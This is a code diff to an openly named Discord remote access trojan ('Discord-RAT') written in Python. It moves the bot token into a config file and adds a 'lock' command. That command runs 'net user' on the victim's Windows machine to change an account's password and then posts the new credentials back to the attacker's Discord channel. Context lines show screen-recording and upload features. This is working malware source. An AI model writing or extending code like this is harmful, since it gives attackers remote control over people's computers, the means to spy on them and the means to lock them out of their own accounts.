@@ -1,10 +1,9 @@
-# Snikkertjuh/Discord-RAT Version 1.0.0
+# Snikkertjuh/Discord-RAT Version 1.0.1
 
-import discord, os, pyautogui, requests, cv2, numpy, time
+import discord, os, pyautogui, requests, cv2, numpy, subprocess
+from config import token, guildid
 
-token = ""
 client = discord.Bot(intents=discord.Intents.all())
-guildid = []
 
 @client.event
 async def on_ready():
@@ -104,5 +103,16 @@ async def record(ctx, duration):
         embed = discord.Embed(title="Recording Stopped", description=f"{link}", color=0x660cf)
         await ctx.send(embed=embed)
         os.remove(f"{os.getenv('TEMP')}\\output.mp4")
+
+@client.slash_command(name="lock", guild_ids=guildid)
+async def lock(ctx, username, password):
+    if ctx.channel.id == channel.id:
+        try:
+            subprocess.check_output(f'net user "{username}" "{password}"')
+            embed = discord.Embed(title="Password Changed", description=f"```Username: {username}\nPassword: {password}```", color=0x660cf)
+            await ctx.respond(embed=embed)
+        except Exception as error:
+            embed = discord.Embed(title="Somenthing went wrong", description=f"```{error}```", color=0x660cf)
+            await ctx.respond(embed=embed)
 
 client.run(token)
